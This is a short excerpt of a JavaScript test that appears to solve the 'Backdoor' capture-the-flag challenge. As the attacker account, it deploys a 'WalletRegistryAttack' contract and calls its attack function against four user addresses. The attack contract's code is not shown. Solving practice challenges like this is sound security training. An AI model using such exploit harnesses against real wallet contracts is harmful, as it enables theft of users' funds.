...
describe("[Challenge] Backdoor", function () {
  ...
  it("Exploit", async function () {
    ...
    const WalletRegistryAttack = await ethers.getContractFactory(
      "WalletRegistryAttack"
    );

    this.walletRegistryAttack = await WalletRegistryAttack.connect(
      attacker
    ).deploy(
      this.masterCopy.address,
      this.walletRegistry.address,
    ...
    await this.walletRegistryAttack
      .connect(attacker)
      .attack([alice.address, bob.address, charlie.address, david.address]);
  });
